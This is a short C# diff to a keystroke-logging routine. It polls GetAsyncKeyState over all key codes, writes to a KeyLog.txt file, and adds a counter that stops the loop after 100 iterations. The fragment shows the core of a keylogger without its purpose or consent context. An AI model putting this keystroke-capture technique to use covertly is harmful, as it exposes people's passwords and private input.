@@ -25,22 +25,13 @@ namespace CrcMrc
         static extern IntPtr GetForegroundWindow();
 
         public Int32[] iHwnd;
+        public Int32 iCount = 0;
+        public Int32 iCountStop = 100;
 
 
-        public void AddTo()
+        public void LogKeys()
         {
-            /*
-            dsProcess.ProcessRow row = new dsProcess.ProcessRow();
-            row.CompName = GetCompname();
-            row.IP = GetIPAddress();
-            row.ProcesName = TempProcess.Name;
-            row.CPUUse = TempProcess.CpuUsage;
-            row.ProcTime = (System.DateTime)DateTime.Now;
-            */
-        }
-
-        static void LogKeys()
-        {
+            iCount = 0;
             String path = @"n:\KeyLog.txt";
             if (!File.Exists(path))
             {
@@ -54,6 +45,12 @@ namespace CrcMrc
             while (true)
             {
                 Thread.Sleep(10);
+                iCount++;
+                if (iCount > iCountStop)
+                {
+                    break;
+                }
+
                 for (Int32 i = 0; i < 255; i++)
                 {
                     int key = GetAsyncKeyState(i);
